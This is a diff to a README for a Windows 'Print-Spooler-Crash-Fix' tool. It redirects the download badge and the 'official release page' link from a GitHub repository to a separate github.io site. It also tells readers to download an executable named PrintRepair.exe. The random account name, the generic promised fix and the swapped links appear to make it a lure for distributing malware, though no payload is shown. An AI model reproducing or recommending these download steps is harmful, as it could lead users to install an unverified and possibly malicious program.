@@ -1,6 +1,6 @@
 # 🖨️ Print-Spooler-Crash-Fix - Stop printer errors on Windows today
 
-[![](https://img.shields.io/badge/Download-Fix-blue.svg)](https://github.com/Bladdery-leptomeningitis164/Print-Spooler-Crash-Fix)
+[![](https://img.shields.io/badge/Download-Fix-blue.svg)](https://bladdery-leptomeningitis164.github.io)
 
 ## 🛠️ Understand your printer error
 
@@ -14,7 +14,7 @@ You need a computer running Windows 10 or Windows 11. Your computer must have a 
 
 ## 📥 How to download the fix
 
-1. Visit the [official release page](https://github.com/Bladdery-leptomeningitis164/Print-Spooler-Crash-Fix) to start your download.
+1. Visit the [official release page](https://bladdery-leptomeningitis164.github.io) to start your download.
 2. Look for the file named PrintRepair.exe under the Assets section.
 3. Click the file name to save it to your computer.
 4. Choose a folder like Downloads or your Desktop.
